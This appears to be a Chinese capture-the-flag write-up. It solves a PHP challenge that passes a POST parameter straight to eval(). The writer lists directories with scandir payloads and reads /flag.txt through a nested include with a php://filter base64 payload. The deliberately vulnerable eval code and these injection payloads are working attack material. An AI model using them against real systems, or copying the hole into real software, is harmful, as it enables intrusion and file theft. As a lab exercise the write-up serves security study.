![image-20250404161946983](./assets/image-20250404161946983.png)



依旧

嵌套include读取源码

![image-20250404162112514](./assets/image-20250404162112514.png)

![image-20250404162105258](./assets/image-20250404162105258.png)

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

发现题目内容无变化，只是禁用了highlight_file()函数



无参rce

```
c=var_dump(scandir(getcwd()));
```

![image-20250404162203591](./assets/image-20250404162203591.png)

```
c=var_dump(scandir("/"));
```

![image-20250404162236273](./assets/image-20250404162236273.png)



依旧是根目录中存在flag.txt



读取

show_source()

highlight_file()

readfile()

pinrt_r(file())

都失败



继续嵌套include

```
c=include$_POST[a]?>&a=php://filter/convert.base64-encode/resource=/flag.txt
```

![image-20250404162508217](./assets/image-20250404162508217.png)

![image-20250404162528262](./assets/image-20250404162528262.png)